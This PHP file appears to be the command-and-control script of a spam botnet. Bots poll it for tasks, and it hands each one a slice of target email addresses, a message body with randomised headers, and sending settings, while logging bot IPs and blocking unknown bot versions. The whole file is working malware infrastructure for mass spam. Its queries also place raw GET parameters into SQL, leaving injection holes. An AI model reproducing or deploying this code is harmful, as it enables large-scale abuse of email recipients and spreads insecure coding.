<?
 
  $id = $_GET['id'];

  //this is new generation bot
  $task = $_GET['task'];
  $ver = $_GET['ver'];
  
  $ip=$_SERVER['REMOTE_ADDR'];
  $host=$ip; //gethostbyaddr($ip);
  
  
  
    
     $bodys_dir = "./bodys/";
     $headers_dir = "./headers/";
     $lists_dir = "./lists/";
     $tasks_dir = "./tasks/";
     
     require("cfg.php");
     require("macro.php");
     
     $status_in_success = 0;
     $status_in_process = 1;
     
     if ($ver == '')
       $ver = 0;
     $tasks = @mysql_query("SELECT * FROM tasks WHERE (`status` = $status_in_process) and (`ver` = $ver) ORDER BY id LIMIT 1;");
     if (mysql_num_rows($tasks) < 1) {
       $tasks = @mysql_query("SELECT * FROM tasks WHERE (`status` = $status_in_process) and (`ver` = \"\") ORDER BY id LIMIT 1;");
       if (mysql_num_rows($tasks) < 1) {
         //mysql_close($dbase);
         exit("Fuck off 1");
       }
     }

     if (isset($_GET['ver']))
     {
       $Bots = @mysql_query("SELECT * FROM Bots;");
       $Ver = $_GET['ver'];
       if (mysql_num_rows($Bots) > 0)
       {
         $Found = 0;
         for ($i = 0; $i < mysql_num_rows($Bots); $i++)
         {
           if (mysql_result($Bots,$i,'Ver') === $Ver)
             $Found = 1;
         }
         if ($Found == 0)
           exit("You are blocked.");
       }
     }
   
     
     
     function rnd_header($str) {
       global $headers_dir;
       $arrhdr=explode(",",$str);
       $file = $headers_dir.$arrhdr[mt_rand(0,count($arrhdr)-1)];
       while (!file_exists($file)) $file = $headers_dir.$arrhdr[mt_rand(0,count($arrhdr)-1)];
       return $file;
     }
     
     function get_list($file,$ofile,$count,&$resint) {
       global $lists_dir,$tasks_dir,$status_in_process,$status_in_success;
       $str = "";
       $f=@fopen($lists_dir.$file,"rb");
       if (!$f) return $str;
       
       $ft = fopen($tasks_dir.$ofile,"ab+");
       if (!$ft) return $str;
       flock($ft,2);
       $c = fread($ft,100);
       fseek($f,$c);
       
   //  $status_in_success = 0;
   //  $status_in_process = 1;
   
       $resint = $status_in_process;
   
       for($i=0;$i < $count;$i++) {
         if (feof($f)) {
	 $resint = $status_in_success;
	 break;
         }
		
         //------------------
         $str1=fgets($f,150);
         $str1 = str_replace(" ","",$str1);
         $str .= $str1;
         //------------------
         if (feof($f)) {
	 $resint = $status_in_success;
	 break;
         }
         
         
       }
       
       $offset=ftell($f);
       ftruncate($ft,0);
       fwrite($ft,$offset);
       flock($ft,3);
       fclose($ft);
       
       fclose($f);
       
       return $str;
     }
     
     $tid = mysql_result($tasks,0,'id');
     $style = mysql_result($tasks,0,'Style');


     if ($log_activity)
       @mysql_query("INSERT INTO BotActivity (DateTime,BotId,BotVer,ActivityType,AdditionalId,IP) VALUES ('".date("Y-m-d H:i:s")."','$id','$ver','2','$tid','$ip');");
       
   
     $body = stripslashes(join('',file($bodys_dir.mysql_result($tasks,0,'body_id'))));
     if ($style==0)
       $header = stripslashes(join('',file(rnd_header(mysql_result($tasks,0,'header')))));
     
     $lpr1 = mysql_result($tasks,0,'lpr1');
     $lpr2 = mysql_result($tasks,0,'lpr2');
     
     $lpr = rand($lpr1, $lpr2);
     
     
     $list = get_list(mysql_result($tasks,0,'list'),$tid,$lpr,$resint);
     if ($resint == $status_in_success) {
       @mysql_query("UPDATE tasks SET `status`='$status_in_success' WHERE `id`='$tid';");
       //exit("Fuck off 2");
     }
   
     if ($style==0)
     {
       $text = str_replace("%MESSAGE_BODY",$body,$header);
       $text .= "\r\n";
     } else {
       $text = $body;
     }
       
     MacroBody($text);

     //$DomainsDBase=mysql_connect($dbserver,$dbusrname, $passwrd) or die ('I cannot connect to the database because: ' . mysql_error());
     mysql_select_db($dbNameDomains) or die("Could not select database: $dbNameDomains: ".mysql_error()."\n");
     $Domains = @mysql_query("SELECT DomainName FROM DomainsInfo WHERE (`IP` = '$ip') and (`State` = 1) LIMIT 1;");
     if (mysql_num_rows($Domains) < 1) {    
       $host = $ip;
     } else {
       $host = mysql_result($Domains, 0, 'DomainName');
     }
     
     mysql_close($dbase);       
     echo "\r\n\r\n<info>\r\n";
     echo "taskid=$tid\r\n";
     echo "realip=$ip\r\n";
     echo "hostname=$host\r\n"; 
     echo "maxthread=5\r\n";
     echo "style=$style\r\n";
     echo "</info>\r\n";
     echo "<emails>\r\n";
     echo "$list";
     echo "</emails>\r\n";
     echo "<text>\r\n";
     echo "$text";
     echo "</text>\r\n";
     
?>
